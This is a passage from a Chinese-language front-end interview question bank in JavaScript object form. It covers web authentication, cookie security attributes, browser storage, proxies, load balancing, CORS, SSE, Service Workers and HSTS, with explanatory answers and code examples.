                detailedAnswer: '四种鉴权方式对比：\n\nCookie：\n- 浏览器存储，自动随请求发送\n- 大小限制 4KB\n- 可设置 HttpOnly/Secure/SameSite\n- 缺点：CSRF 风险、跨域限制\n\nSession：\n- 服务端存储用户信息\n- sessionId 存在 Cookie 中\n- 服务端有状态，需查询 session 存储\n- 缺点：分布式 session 难、服务端压力大\n\nToken（如 OAuth Token）：\n- 服务端签发，客户端存储\n- 每次请求放在 Authorization 头\n- 无状态，服务端不存储\n- 缺点：无法主动失效（需黑名单）\n\nJWT（JSON Web Token）：\n- 结构：Header.Payload.Signature\n  - Header：算法类型\n  - Payload：用户信息（自包含）\n  - Signature：签名（防篡改）\n- 无状态，服务端无需查询数据库\n- 自包含用户信息\n- 缺点：无法主动失效、Payload 不加密（勿存敏感信息）\n\n适用场景：\n- Cookie + Session：传统 Web 应用（SSR）\n- Token/JWT：前后端分离、移动端、微服务\n- OAuth Token：第三方登录\n\nJWT 使用注意：\n- 设置较短过期时间\n- 用 Refresh Token 续期\n- Payload 不要存敏感信息\n- 用 HTTPS 传输\n- 服务端验证签名',
                codeExample: `// 1. Cookie + Session（传统方式）\n// 服务端\nconst sessionId = generateId()\nsessionStore[sessionId] = { userId: 123, name: "Alice" }\nres.setHeader("Set-Cookie", "sid=" + sessionId + "; HttpOnly; Secure; SameSite=Strict")\n// 后续请求自动带 Cookie，服务端查 session\n\n// 2. JWT 鉴权\nconst jwt = require("jsonwebtoken")\n// 登录签发\nconst token = jwt.sign(\n  { userId: 123, name: "Alice" }, // Payload\n  "secret-key",                    // 密钥\n  { expiresIn: "2h" }              // 过期时间\n)\n// 客户端存储 localStorage，请求时带上\nfetch("/api/data", {\n  headers: { Authorization: "Bearer " + token },\n})\n// 服务端验证\ntry {\n  const decoded = jwt.verify(token, "secret-key")\n  console.log(decoded.userId) // 123\n} catch (e) {\n  // token 无效或过期\n}\n\n// JWT 结构：xxx.yyy.zzz\n// Header.Payload.Signature\n// eyJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOjEyM30.abc123signature`,
                difficulty: 'hard',
                tags: ['Cookie', 'Session', 'Token', 'JWT', '鉴权'],
                keyPoints: ['Cookie 浏览器存储自动发送', 'Session 服务端有状态', 'Token 无状态令牌', 'JWT 自包含签名'],
              },
              {
                id: 'network-cookie-attrs',
                domain: 'network',
                question: 'Cookie 的安全属性有哪些？HttpOnly、Secure、SameSite、Partitioned 各起什么作用？',
                shortAnswer: 'HttpOnly：禁止 JS 访问（防 XSS 偷 Cookie）。Secure：仅 HTTPS 发送。SameSite：控制跨站发送（Strict/Lax/None）。Partitioned：第三方 Cookie 隔离（CHIPS）。',
                detailedAnswer: 'Cookie 安全属性详解：\n\n1. HttpOnly：\n- 设置后 JavaScript 无法通过 document.cookie 访问\n- 防 XSS 攻击窃取 Cookie\n- 敏感 Cookie（如 sessionId）必须设置\n\n2. Secure：\n- 仅在 HTTPS 连接下发送\n- 防止中间人窃听\n- 现代浏览器强制 Secure + SameSite=None\n\n3. SameSite（防 CSRF）：\n- Strict：完全不发跨站请求 Cookie（最严格，但影响体验）\n- Lax：跨站导航的 GET 请求发 Cookie（默认值，平衡安全与体验）\n- None：跨站都发（必须配合 Secure）\n- 防 CSRF：攻击者网站发请求不带 Cookie\n\n4. Partitioned（CHIPS，分区 Cookie）：\n- 第三方 Cookie 按顶级站点分区\n- a.com 嵌入 b.com 的内容，b.com 的 Cookie 按 a.com 分区\n- 不同顶级站点的 Cookie 隔离\n- 解决第三方 Cookie 被禁用的问题\n\n其他属性：\n- Domain/Path：作用范围\n- Max-Age/Expires：过期时间\n- 优先级 Priority（Low/Medium/High）：超限时优先保留\n\n安全最佳实践：\n- sessionId：HttpOnly + Secure + SameSite=Lax\n- CSRF Token：额外防护\n- 不要在 Cookie 存敏感信息明文',
                codeExample: `// Cookie 安全属性设置\n// 服务端设置\nres.setHeader("Set-Cookie", [\n  // 敏感 Cookie：最严格安全配置\n  "sessionId=abc123; HttpOnly; Secure; SameSite=Lax; Max-Age=3600; Path=/",\n  // 非敏感 Cookie（需跨站访问）\n  "trackingId=xyz789; Secure; SameSite=None; Max-Age=86400",\n  // 第三方分区 Cookie（CHIPS）\n  "adId=def456; Secure; SameSite=None; Partitioned; Max-Age=86400",\n])\n\n// 前端读取 Cookie（仅非 HttpOnly）\nconsole.log(document.cookie) // 只能看到非 HttpOnly 的 Cookie\n\n// SameSite 行为对比\n// SameSite=Strict：\n//   用户从 b.com 点击链接到 a.com → 不带 a.com 的 Cookie（未登录状态）\n// SameSite=Lax（默认）：\n//   用户从 b.com 点击链接到 a.com → 带 a.com 的 Cookie（顶级导航 GET 发送）\n//   a.com 的 fetch/fetch POST → 不带 Cookie\n// SameSite=None：\n//   所有跨站请求都带 Cookie（需 Secure）`,
                difficulty: 'medium',
                tags: ['Cookie', 'HttpOnly', 'SameSite', '安全'],
                keyPoints: ['HttpOnly 防 XSS 偷 Cookie', 'Secure 仅 HTTPS 发送', 'SameSite 防 CSRF', 'Partitioned 第三方隔离'],
              },
              {
                id: 'network-storage',
                domain: 'network',
                question: '浏览器本地存储方案有哪些？localStorage、sessionStorage、IndexedDB、Cache API 的区别？',
                shortAnswer: 'localStorage：持久化 5-10MB 同步 API。sessionStorage：会话级 5MB。IndexedDB：异步 NoSQL 数据库 250MB+。Cache API：离线缓存 Response 对象（Service Worker 配合）。',
                detailedAnswer: '浏览器存储方案对比：\n\n| 方案 | 容量 | 生命周期 | API | 同步/异步 |\n|------|------|----------|-----|----------|\n| Cookie | 4KB | 可设置过期 | document.cookie | 同步 |\n| localStorage | 5-10MB | 持久 | getItem/setItem | 同步 |\n| sessionStorage | 5MB | 会话（关闭标签） | getItem/setItem | 同步 |\n| IndexedDB | 250MB+ | 持久 | 事务 + 游标 | 异步 |\n| Cache API | 几百 MB | 持久 | caches.open | 异步 |\n| Memory（JS 变量） | 无限 | 页面卸载即失 | 变量 | 同步 |\n\nlocalStorage：\n- 同源共享，持久化\n- 同步 API（阻塞主线程，大数据慎用）\n- 只能存字符串（对象需 JSON.stringify）\n- 适用：用户偏好、主题、小配置\n\nsessionStorage：\n- 同源 + 同标签页，关闭标签即清\n- 适用：临时表单数据、单页会话状态\n\nIndexedDB：\n- 异步 NoSQL 数据库\n- 支持事务、索引、游标\n- 可存对象、文件、Blob\n- 容量大（通常为磁盘配额的一定比例）\n- 适用：离线应用、大量结构化数据\n\nCache API：\n- 专为缓存 Response 设计\n- 配合 Service Worker 实现离线\n- 适用：PWA 离线缓存、资源缓存\n\n选择建议：\n- 小数据（< 5MB）：localStorage\n- 临时数据：sessionStorage\n- 大数据/结构化：IndexedDB\n- 离线资源：Cache API\n- 认证：Cookie（HttpOnly）',
                codeExample: `// 1. localStorage（同步，小数据）\nlocalStorage.setItem("theme", "dark")\nconst theme = localStorage.getItem("theme")\n// 存对象\nlocalStorage.setItem("user", JSON.stringify({ name: "Alice" }))\nconst user = JSON.parse(localStorage.getItem("user"))\nlocalStorage.removeItem("theme")\nlocalStorage.clear()\n\n// 2. sessionStorage（会话级）\nsessionStorage.setItem("formDraft", "data")\n// 关闭标签后自动清除\n\n// 3. IndexedDB（异步，大数据）\nconst db = await new Promise((resolve, reject) => {\n  const req = indexedDB.open("MyDB", 1)\n  req.onupgradeneeded = (e) => {\n    const db = e.target.result\n    if (!db.objectStoreNames.contains("users")) {\n      db.createObjectStore("users", { keyPath: "id" })\n    }\n  }\n  req.onsuccess = (e) => resolve(e.target.result)\n  req.onerror = (e) => reject(e.target.error)\n})\n// 写入\nconst tx = db.transaction("users", "readwrite")\ntx.objectStore("users").put({ id: 1, name: "Alice" })\nawait new Promise((r) => (tx.oncomplete = r))\n// 读取\nconst getRequest = db.transaction("users").objectStore("users").get(1)\nconst result = await new Promise((r) => (getRequest.onsuccess = () => r(getRequest.result)))\n\n// 4. Cache API（离线资源）\nconst cache = await caches.open("v1")\nawait cache.add("/api/data") // 缓存响应\nconst response = await cache.match("/api/data") // 读取缓存`,
                difficulty: 'medium',
                tags: ['localStorage', 'IndexedDB', '存储', 'Cache API'],
                keyPoints: ['localStorage 同步持久 5MB', 'sessionStorage 会话级', 'IndexedDB 异步大数据', 'Cache API 离线缓存'],
              },
              {
                id: 'network-proxy',
                domain: 'network',
                question: '正向代理和反向代理的区别？各自的应用场景？',
                shortAnswer: '正向代理：代理客户端，服务端不知道真实客户端（VPN、翻墙）。反向代理：代理服务端，客户端不知道真实服务端（Nginx、负载均衡）。两者代理对象不同。',
                detailedAnswer: '正向代理（Forward Proxy）：\n- 代理客户端\n- 客户端知道要访问谁，通过代理转发\n- 服务端不知道真实客户端\n- 场景：\n  - VPN（翻墙）\n  - 公司内网访问外网\n  - 缓存加速\n  - 隐藏客户端 IP\n  - 访问控制\n\n反向代理（Reverse Proxy）：\n- 代理服务端\n- 客户端以为访问的是真实服务端，实际是代理\n- 客户端不知道真实服务端\n- 场景：\n  - 负载均衡（Nginx）\n  - 静态资源缓存\n  - SSL 终止（HTTPS 卸载）\n  - 安全防护（WAF）\n  - API 网关\n\n核心区别：\n| 维度 | 正向代理 | 反向代理 |\n|------|----------|----------|\n| 代理对象 | 客户端 | 服务端 |\n| 谁配置 | 客户端 | 服务端 |\n| 对谁透明 | 服务端 | 客户端 |\n| 典型场景 | VPN/翻墙 | Nginx/CDN |\n\n反向代理实现负载均衡：\n1. 客户端请求反向代理服务器\n2. 代理根据策略选择一台后端服务器\n3. 转发请求，拿到响应后返回客户端\n4. 客户端只与代理交互\n\nNginx 反向代理示例：\nlocation /api {\n  proxy_pass http://backend;\n}',
                codeExample: `// Nginx 反向代理 + 负载均衡配置\n// nginx.conf\n// upstream backend {\n//   server 192.168.1.1:8080 weight=3;\n//   server 192.168.1.2:8080 weight=2;\n//   server 192.168.1.3:8080 weight=1;\n// }\n// server {\n//   listen 80;\n//   location /api {\n//     proxy_pass http://backend;\n//     proxy_set_header Host $host;\n//     proxy_set_header X-Real-IP $remote_addr;\n//   }\n//   location / {\n//     root /var/www/html;\n//     try_files $uri $uri/ /index.html;\n//   }\n// }\n\n// 前端开发用正向代理（webpack-dev-server）\n// 代理前端请求到后端 API，解决跨域\n// devServer: {\n//   proxy: {\n//     "/api": {\n//       target: "http://localhost:3000",\n//       changeOrigin: true,\n//       pathRewrite: { "^/api": "" },\n//     },\n//   },\n// }\n\n// Node.js 实现简易反向代理\nconst http = require("http")\nconst httpProxy = require("http-proxy")\nconst proxy = httpProxy.createProxyServer({})\nhttp.createServer((req, res) => {\n  // 负载均衡：轮询选择后端\n  const backends = ["http://localhost:3001", "http://localhost:3002"]\n  const target = backends[counter++ % backends.length]\n  proxy.web(req, res, { target })\n}).listen(80)`,
                difficulty: 'medium',
                tags: ['代理', '正向代理', '反向代理', 'Nginx'],
                keyPoints: ['正向代理代理客户端', '反向代理代理服务端', '正向 VPN 反向 Nginx', '反向代理做负载均衡'],
              },
              {
                id: 'network-load-balance',
                domain: 'network',
                question: '负载均衡有哪些策略？轮询、加权轮询、IP 哈希、最少连接、一致性哈希的区别？',
                shortAnswer: '轮询：依次分配。加权轮询：按性能分配权重。IP 哈希：相同 IP 固定到同一台（会话保持）。最少连接：分配给连接数最少的。一致性哈希：节点变动时最小化迁移。',
                detailedAnswer: '负载均衡策略：\n\n1. 轮询（Round Robin）：\n- 依次分配请求：A→B→C→A→B→C\n- 简单公平，默认策略\n- 缺点：不考虑服务器性能差异\n\n2. 加权轮询（Weighted Round Robin）：\n- 按权重分配：A(5)→B(3)→C(1)\n- 性能强的服务器权重高\n- 适用：服务器性能不均\n\n3. IP 哈希（IP Hash）：\n- 相同客户端 IP 固定到同一服务器\n- 会话保持（Session 粘滞）\n- 缺点：服务器变动会导致哈希重分布\n\n4. 最少连接（Least Connections）：\n- 分配给当前连接数最少的服务器\n- 动态感知服务器负载\n- 适用：请求处理时间差异大\n\n5. 一致性哈希（Consistent Hashing）：\n- 哈希环：0 ~ 2^32-1\n- 服务器和请求都映射到环上\n- 请求顺时针找到最近的服务器\n- 优点：节点增减只影响相邻节点\n- 适用：缓存集群（Redis、Memcached）\n\n6. 随机（Random）：\n- 随机选择\n- 简单，但可能不均匀\n\n7. 最短响应时间（Least Response Time）：\n- 选择响应最快的服务器\n- 需要监控响应时间\n\n实现层次：\n- DNS 负载均衡：DNS 解析到不同 IP\n- L4 负载均衡：传输层（IP+端口），如 LVS\n- L7 负载均衡：应用层（HTTP 头/URL），如 Nginx\n\n健康检查：\n- 定期检测服务器健康状态\n- 故障服务器从池中剔除\n- 恢复后自动加入',
                codeExample: `// 负载均衡策略实现\nconst backends = [\n  { url: "http://a.com", weight: 5, connections: 0 },\n  { url: "http://b.com", weight: 3, connections: 0 },\n  { url: "http://c.com", weight: 1, connections: 0 },\n]\n\n// 1. 轮询\nlet rrIndex = 0\nfunction roundRobin() {\n  return backends[rrIndex++ % backends.length]\n}\n\n// 2. 加权轮询\nconst weightedList = backends.flatMap((b) => Array(b.weight).fill(b))\nlet wIndex = 0\nfunction weightedRoundRobin() {\n  return weightedList[wIndex++ % weightedList.length]\n}\n\n// 3. IP 哈希（会话保持）\nfunction ipHash(clientIp) {\n  const hash = clientIp.split(".").reduce((a, b) => (a << 8) + parseInt(b), 0)\n  return backends[hash % backends.length]\n}\n\n// 4. 最少连接\nfunction leastConnections() {\n  return backends.reduce((min, b) => (b.connections < min.connections ? b : min))\n}\n\n// 5. 一致性哈希\nconst { ConsistentHashing } = require("consistent-hash")\nconst ring = new ConsistentHashing()\nbackends.forEach((b) => ring.add(b.url))\nfunction consistentHash(key) {\n  return ring.get(key) // 节点变动时只影响相邻 key\n}`,
                difficulty: 'hard',
                tags: ['负载均衡', '轮询', '一致性哈希', 'Nginx'],
                keyPoints: ['轮询依次加权按权重', 'IP 哈希会话保持', '最少连接动态感知', '一致性哈希最小迁移'],
              },
              {
                id: 'network-cross-domain-solutions',
                domain: 'network',
                question: '跨域解决方案有哪些？JSONP、CORS、代理、postMessage、WebSocket 各有何优劣？',
                shortAnswer: 'CORS：标准方案，服务端设置响应头。JSONP：仅 GET，利用 script 标签。代理：开发用 webpack-dev-server，生产用 Nginx。postMessage：跨窗口通信。WebSocket：不受同源策略限制。',
                detailedAnswer: '跨域解决方案汇总：\n\n1. CORS（推荐）：\n- 服务端设置 Access-Control-Allow-Origin\n- 简单请求直接发送\n- 复杂请求先发 OPTIONS 预检\n- 优点：标准、支持所有 HTTP 方法\n- 缺点：需服务端配合\n\n2. JSONP（已过时）：\n- 利用 <script> 标签不受同源策略限制\n- 只支持 GET 请求\n- 服务端返回 callback(data)\n- 优点：兼容老浏览器\n- 缺点：仅 GET、有 XSS 风险、难处理错误\n\n3. 代理（Proxy）：\n- 开发环境：webpack-dev-server / vite proxy\n- 生产环境：Nginx 反向代理\n- 前端请求同源代理，代理转发到目标\n- 优点：前端无感、完全规避跨域\n- 缺点：增加一层代理，延迟略增\n\n4. postMessage：\n- 跨窗口通信（iframe、window.open）\n- source.postMessage(data, origin)\n- 接收方监听 message 事件\n- 优点：安全的跨源通信\n- 缺点：仅窗口间，不适合 HTTP 请求\n\n5. WebSocket：\n- 不受同源策略限制\n- 全双工持久连接\n- 优点：实时双向通信\n- 缺点：需服务端支持 WebSocket\n\n6. document.domain（已废弃）：\n- 主域相同子域不同时设置 document.domain\n- 仅适用于主域相同\n- 现代浏览器已废弃\n\n7. window.name：\n- 窗口 name 跨页面保持\n- 已过时\n\n选择建议：\n- 现代 Web 应用：CORS\n- 开发环境：代理\n- iframe 通信：postMessage\n- 实时通信：WebSocket',
                codeExample: `// 1. CORS（服务端设置）\n// Node.js Express\n// app.use((req, res, next) => {\n//   res.header("Access-Control-Allow-Origin", "https://example.com")\n//   res.header("Access-Control-Allow-Methods", "GET,POST,PUT,DELETE")\n//   res.header("Access-Control-Allow-Headers", "Content-Type,Authorization")\n//   res.header("Access-Control-Allow-Credentials", "true")\n//   if (req.method === "OPTIONS") return res.sendStatus(204)\n//   next()\n// })\n\n// 2. JSONP（仅 GET）\nfunction jsonp(url, callback) {\n  const cbName = "jsonp_" + Date.now()\n  window[cbName] = (data) => {\n    callback(data)\n    delete window[cbName]\n    script.remove()\n  }\n  const script = document.createElement("script")\n  script.src = url + "?callback=" + cbName\n  document.body.appendChild(script)\n}\njsonp("https://api.example.com/data", (data) => console.log(data))\n\n// 3. 代理（vite.config.js）\n// server: {\n//   proxy: {\n//     "/api": {\n//       target: "http://backend.com",\n//       changeOrigin: true,\n//       rewrite: (path) => path.replace(/^\\/api/, ""),\n//     },\n//   },\n// }\n\n// 4. postMessage（跨窗口）\n// 父窗口\nconst iframe = document.querySelector("iframe")\niframe.contentWindow.postMessage({ type: "data", value: 123 }, "https://child.com")\n// 子窗口接收\nwindow.addEventListener("message", (e) => {\n  if (e.origin !== "https://parent.com") return // 验证来源\n  console.log(e.data)\n})\n\n// 5. WebSocket（不受同源策略限制）\nconst ws = new WebSocket("wss://api.example.com/ws")\nws.onmessage = (e) => console.log(e.data)`,
                difficulty: 'medium',
                tags: ['跨域', 'CORS', 'JSONP', '代理', 'postMessage'],
                keyPoints: ['CORS 标准方案服务端设置', 'JSONP 仅 GET 用 script', '代理开发用 vite 生产用 Nginx', 'postMessage 跨窗口通信'],
              },
              {
                id: 'network-get-vs-post',
                domain: 'network',
                question: 'GET 和 POST 的区别？为何说本质都是 TCP 请求？',
                shortAnswer: '语义：GET 查询、POST 提交。参数：GET 在 URL、POST 在 body。幂等：GET 幂等、POST 不幂等。本质都是 TCP 请求，区别是 HTTP 语义约定和浏览器/服务器实现规则不同。',
                detailedAnswer: 'GET 和 POST 的区别：\n\n1. 语义：\n- GET：获取资源（安全、幂等）\n- POST：提交数据创建资源（不幂等）\n\n2. 参数位置：\n- GET：URL 查询字符串 ?key=value\n- POST：请求体 body\n\n3. 长度限制：\n- GET：URL 长度限制（浏览器约 2KB，服务器约 8KB）\n- POST：无限制（受服务器配置限制）\n\n4. 缓存：\n- GET：可被浏览器/CDN 缓存\n- POST：默认不缓存\n\n5. 历史记录：\n- GET：保留在浏览器历史\n- POST：不保留\n\n6. 书签：\n- GET：可收藏为书签\n- POST：不能\n\n7. 编码：\n- GET：application/x-www-form-urlencoded\n- POST：多种（form-data、json、text）\n\n8. 回退：\n- GET：回退无害\n- POST：回退会重新提交（需确认）\n\n9. 安全性：\n- GET：参数暴露在 URL（不要存敏感信息）\n- POST：参数在 body（相对安全，但 HTTPS 下都能被解密）\n\n本质都是 TCP 请求：\n- GET 和 POST 在 TCP 层没有区别\n- 都是建立 TCP 连接、发送 HTTP 报文\n- 区别在 HTTP 协议的语义约定\n- 浏览器/服务器按约定实现不同行为\n\n常见误解：\n- GET 不能有 body：技术上可以，但不规范\n- POST 比 GET 安全：仅因参数不在 URL，HTTPS 下都一样\n- GET 产生一个 TCP 包，POST 两个：取决于实现，非标准',
                codeExample: `// GET 请求\nfetch("https://api.example.com/users?name=Alice&age=25")\n  .then((res) => res.json())\n// 请求行：GET /users?name=Alice&age=25 HTTP/1.1\n// 参数在 URL\n\n// POST 请求\nfetch("https://api.example.com/users", {\n  method: "POST",\n  headers: { "Content-Type": "application/json" },\n  body: JSON.stringify({ name: "Alice", age: 25 }),\n})\n// 请求行：POST /users HTTP/1.1\n// 参数在 body\n\n// 本质都是 TCP 请求\n// GET 报文：\n//   GET /api/users?id=1 HTTP/1.1\\r\\n\n//   Host: example.com\\r\\n\\r\\n\n//\n// POST 报文：\n//   POST /api/users HTTP/1.1\\r\\n\n//   Host: example.com\\r\\n\n//   Content-Type: application/json\\r\\n\n//   Content-Length: 25\\r\\n\\r\\n\n//   {"name":"Alice","age":25}\n\n// 何时用 GET vs POST：\n// GET：查询、获取数据、可缓存、可收藏\n// POST：创建、提交敏感数据、大量数据、文件上传`,
                difficulty: 'easy',
                tags: ['GET', 'POST', 'HTTP', '面试必考'],
                keyPoints: ['GET 查询幂等参数在 URL', 'POST 提交不幂等参数在 body', 'GET 可缓存 POST 不缓存', '本质都是 TCP 请求'],
              },
              {
                id: 'network-sse',
                domain: 'network',
                question: 'SSE（Server-Sent Events）是什么？和 WebSocket 有何区别？',
                shortAnswer: 'SSE 是服务端单向推送技术，基于 HTTP 长连接，用 text/event-stream 格式。与 WebSocket 区别：SSE 单向（服务端→客户端）、基于 HTTP、自动重连、轻量；WebSocket 双向、自定义协议、需手动重连。',
                detailedAnswer: 'SSE（Server-Sent Events）：\n- 服务端单向推送（Server → Client）\n- 基于 HTTP 长连接\n- 响应头：Content-Type: text/event-stream\n- 数据格式：data: 内容\\n\\n\n- 自动重连（断线后浏览器自动重连）\n- 支持自定义事件类型\n\nSSE vs WebSocket：\n\n| 维度 | SSE | WebSocket |\n|------|-----|-----------|\n| 方向 | 单向（Server→Client） | 双向 |\n| 协议 | HTTP | 自定义帧协议 |\n| 端口 | 80/443 | 80/443 |\n| 重连 | 自动重连 | 需手动实现 |\n| 数据格式 | 文本（UTF-8） | 文本 + 二进制 |\n| 连接数限制 | 浏览器 6 个同源 | 无限制 |\n| 代理友好 | 是（HTTP） | 需升级支持 |\n| 复杂度 | 低 | 高 |\n| HTTPS | 支持 | 支持 |\n\nSSE 适用场景：\n- 服务端推送通知（消息、告警）\n- 实时数据流（股票行情、新闻）\n- ChatGPT 流式响应（SSE 实现）\n- 日志流、状态更新\n\nWebSocket 适用场景：\n- 实时聊天（双向）\n- 协同编辑（双向）\n- 在线游戏（双向）\n- 视频会议（WebRTC 信令）\n\nSSE 数据格式：\n- data: 消息内容\\n\\n\n- event: 自定义事件\\n\n- id: 消息 ID\\n\n- retry: 重连间隔(ms)\\n\n\nSSE 优势：\n- 基于 HTTP，无需特殊协议升级\n- 自动重连，简单可靠\n- 与 HTTP/2 兼容（多路复用）\n- 轻量，适合纯推送场景',
                codeExample: `// SSE 客户端\nconst eventSource = new EventSource("/api/stream")\neventSource.onmessage = (e) => {\n  console.log("默认事件:", e.data)\n}\neventSource.addEventListener("update", (e) => {\n  console.log("自定义事件 update:", e.data)\n})\neventSource.onerror = (e) => {\n  console.log("连接断开，浏览器会自动重连")\n}\n// 关闭连接\neventSource.close()\n\n// SSE 服务端（Node.js）\n// app.get("/api/stream", (req, res) => {\n//   res.setHeader("Content-Type", "text/event-stream")\n//   res.setHeader("Cache-Control", "no-cache")\n//   res.setHeader("Connection", "keep-alive")\n//   setInterval(() => {\n//     res.write("data: " + JSON.stringify({ time: Date.now() }) + "\\n\\n")\n//   }, 1000)\n// })\n\n// SSE 数据格式示例\n// data: {"time":1234567890}\\n\\n\n// event: update\\n data: {"score":100}\\n\\n\n// id: 123\\n retry: 5000\\n data: 消息内容\\n\\n\n\n// ChatGPT 流式响应（SSE 实现）\n// const response = await fetch("/chat", { method: "POST" })\n// const reader = response.body.getReader()\n// while (true) {\n//   const { done, value } = await reader.read()\n//   if (done) break\n//   // 解析 SSE 格式数据，逐字渲染\n// }`,
                difficulty: 'medium',
                tags: ['SSE', 'WebSocket', '实时通信', 'Server-Sent Events'],
                keyPoints: ['SSE 单向推送基于 HTTP', 'WebSocket 双向自定义协议', 'SSE 自动重连轻量', 'SSE 适合 ChatGPT 流式'],
              },
              {
                id: 'network-service-worker',
                domain: 'network',
                question: 'Service Worker 是什么？如何实现离线缓存（PWA）？',
                shortAnswer: 'Service Worker 是运行在浏览器后台的 JS 脚本（独立线程），可拦截网络请求、管理缓存（Cache API）、实现离线访问、推送通知。PWA 通过 Service Worker + Manifest 实现类原生应用体验。',
                detailedAnswer: 'Service Worker：\n- 独立于主线程的后台脚本\n- 可拦截网络请求（fetch 事件）\n- 可管理 Cache API（离线缓存）\n- 生命周期：install → activate → fetch\n- 仅 HTTPS（localhost 除外）\n- 不能访问 DOM（通过 postMessage 通信）\n\n生命周期：\n1. install：首次安装/更新时触发，预缓存资源\n2. activate：激活后接管页面，清理旧缓存\n3. fetch：拦截网络请求，从缓存或网络响应\n4. message：与主线程通信\n\nPWA（Progressive Web App）：\n- Service Worker（离线能力）\n- Web App Manifest（可安装）\n- HTTPS（安全）\n- 响应式设计\n- 类原生体验\n\n离线缓存策略：\n1. Cache First：先查缓存，无则请求（静态资源）\n2. Network First：先请求，失败用缓存（动态内容）\n3. Stale While Revalidate：用缓存同时更新（兼顾速度与新鲜度）\n4. Network Only：仅网络\n5. Cache Only：仅缓存\n\n使用场景：\n- 离线访问（断网可用）\n- 资源缓存（加速加载）\n- 推送通知（Push Notification）\n- 后台同步（Background Sync）\n- 可安装应用（Add to Home Screen）',
                codeExample: `// 注册 Service Worker（主线程）\nif ("serviceWorker" in navigator) {\n  navigator.serviceWorker.register("/sw.js").then((reg) => {\n    console.log("SW 注册成功")\n  })\n}\n\n// sw.js - Service Worker 脚本\nconst CACHE_NAME = "v1"\nconst ASSETS = ["/", "/index.html", "/style.css", "/app.js"]\n\n// 1. 安装：预缓存核心资源\nself.addEventListener("install", (e) => {\n  e.waitUntil(caches.open(CACHE_NAME).then((c) => c.addAll(ASSETS)))\n})\n\n// 2. 激活：清理旧缓存\nself.addEventListener("activate", (e) => {\n  e.waitUntil(\n    caches.keys().then((keys) =>\n      Promise.all(keys.filter((k) => k !== CACHE_NAME).map((k) => caches.delete(k))),\n    ),\n  )\n})\n\n// 3. 拦截请求：Stale While Revalidate 策略\nself.addEventListener("fetch", (e) => {\n  e.respondWith(\n    caches.match(e.request).then((cached) => {\n      const fetchPromise = fetch(e.request).then((res) => {\n        // 更新缓存\n        const clone = res.clone()\n        caches.open(CACHE_NAME).then((c) => c.put(e.request, clone))\n        return res\n      })\n      return cached || fetchPromise // 有缓存用缓存，同时更新\n    }),\n  )\n})\n\n// 4. 推送通知\nself.addEventListener("push", (e) => {\n  e.waitUntil(self.registration.showNotification("标题", { body: e.data.text() }))\n})`,
                difficulty: 'hard',
                tags: ['Service Worker', 'PWA', '离线缓存', 'Cache API'],
                keyPoints: ['Service Worker 独立线程拦截请求', 'Cache API 管理离线缓存', '缓存策略 Cache/Network First', 'PWA 类原生体验'],
              },
              {
                id: 'network-hsts',
                domain: 'network',
                question: 'HSTS 是什么？如何防止 HTTPS 降级攻击？',
                shortAnswer: 'HSTS（HTTP Strict Transport Security）通过响应头强制浏览器后续只用 HTTPS 访问该站点，即使用户输入 HTTP 也自动跳转 HTTPS，防止 SSL 剥离降级攻击。配合 preload list 可首次访问也强制 HTTPS。',
                detailedAnswer: 'HSTS（HTTP Strict Transport Security）：\n- HTTP 响应头，强制浏览器使用 HTTPS\n- 防止 SSL 剥离攻击（降级攻击）\n- 浏览器记忆该策略，后续 HTTP 请求自动跳 HTTPS\n\n响应头：\nStrict-Transport-Security: max-age=31536000; includeSubDomains; preload\n\n属性：\n- max-age：策略有效期（秒），建议 1 年（31536000）\n- includeSubDomains：包含子域名\n- preload：申请加入浏览器内置 HSTS 预加载列表\n\nSSL 剥离攻击（降级攻击）：\n1. 用户输入 example.com（HTTP）\n2. 攻击者中间人拦截，将 HTTPS 链接改成 HTTP\n3. 用户以为在安全连接，实际被监听\n4. HSTS 防御：浏览器记住必须 HTTPS，自动跳转\n\nHSTS 的局限：\n- 首次访问仍可能被攻击（未收到 HSTS 头前）\n- 解决：preload list（浏览器内置强制 HTTPS 站点列表）\n\n申请 preload：\n1. 设置 HSTS 头（max-age≥1年、includeSubDomains、preload）\n2. 提交 https://hstspreload.org\n3. 加入 Chrome/Firefox 内置列表\n4. 首次访问也强制 HTTPS\n\n其他 HTTPS 安全头：\n- Content-Security-Policy：防 XSS\n- X-Frame-Options：防点击劫持\n- X-Content-Type-Options: nosniff：防 MIME 嗅探\n- Referrer-Policy：控制 Referer',
                codeExample: `// 服务端设置 HSTS\n// Express\n// app.use((req, res, next) => {\n//   res.setHeader("Strict-Transport-Security", "max-age=31536000; includeSubDomains; preload")\n//   next()\n// })\n\n// Nginx\n// add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;\n\n// HTTP 强制跳转 HTTPS\n// server {\n//   listen 80;\n//   server_name example.com;\n//   return 301 https://$server_name$request_uri;\n// }\n\n// 完整安全头设置\n// app.use((req, res, next) => {\n//   res.setHeader("Strict-Transport-Security", "max-age=31536000; includeSubDomains; preload")\n//   res.setHeader("Content-Security-Policy", "default-src 'self'; script-src 'self'")\n//   res.setHeader("X-Frame-Options", "DENY")\n//   res.setHeader("X-Content-Type-Options", "nosniff")\n//   res.setHeader("Referrer-Policy", "strict-origin-when-cross-origin")\n//   next()\n// })\n\n// 检查站点 HSTS 状态\n// curl -I https://example.com\n// 响应头应包含 Strict-Transport-Security`,
                difficulty: 'medium',
                tags: ['HSTS', 'HTTPS', '安全', '降级攻击'],
                keyPoints: ['HSTS 强制 HTTPS 防降级', 'max-age 记忆期 1 年', 'preload 首次也强制 HTTPS', 'SSL 剥离攻击防御'],
              },
              {
                id: 'network-keep-alive',
                domain: 'network',
                question: 'HTTP keep-alive 是什么？如何复用 TCP 连接？和 HTTP/2 多路复用有何区别？',
                shortAnswer: 'keep-alive 是 HTTP/1.1 默认开启的连接复用机制，一个 TCP 连接可发多个 HTTP 请求（串行）。HTTP/2 多路复用是单一 TCP 连接并行多个请求/响应，解决队头阻塞。区别：keep-alive 串行，多路复用并行。',
